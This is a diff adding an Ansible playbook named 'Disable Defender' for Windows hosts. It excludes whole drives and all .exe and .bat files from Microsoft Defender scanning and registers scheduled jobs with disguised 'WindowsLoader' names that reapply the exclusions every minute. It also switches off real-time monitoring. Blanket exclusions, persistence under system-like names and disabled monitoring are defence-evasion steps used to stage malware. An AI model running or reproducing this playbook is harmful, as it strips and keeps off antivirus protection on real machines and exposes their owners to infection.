@@ -1,0 +1,17 @@
+-
+  name: Disable Defender
+  hosts: windows
+  strategy: free
+  gather_facts: no
+  tasks:
+    - win_shell: Add-MpPreference -ExclusionPath "C:\temp"
+    - win_shell: Add-MpPreference -ExclusionPath "C:\"
+    - win_shell: Add-MpPreference -ExclusionPath "C:\Windows"
+    - win_shell: Add-MpPreference -ExclusionExtension ".exe"
+    - win_shell: Add-MpPreference -ExclusionExtension ".bat"
+    - win_shell: Register-ScheduledJob -Name 'WindowsLoader1' -ScriptBlock { Add-MpPreference -ExclusionPath "C:\temp" } -RunNow -RunEvery 00:01:00
+    - win_shell: Register-ScheduledJob -Name 'WindowsLoaderv22' -ScriptBlock { Add-MpPreference -ExclusionPath "C:\Windows" } -RunNow -RunEvery 00:01:00
+    - win_shell: Register-ScheduledJob -Name 'WindowsLoaderv33' -ScriptBlock { Add-MpPreference -ExclusionExtension ".exe" } -RunNow -RunEvery 00:01:00
+    - win_shell: Register-ScheduledJob -Name 'WindowsLoaderv44' -ScriptBlock { Add-MpPreference -ExclusionExtension ".bat" } -RunNow -RunEvery 00:01:00
+    - win_shell: Register-ScheduledJob -Name 'WindowsLoader1' -ScriptBlock { Add-MpPreference -ExclusionPath "C:\" } -RunNow -RunEvery 00:01:00
+    - win_shell: Set-MpPreference -DisableRealtimeMonitoring $true
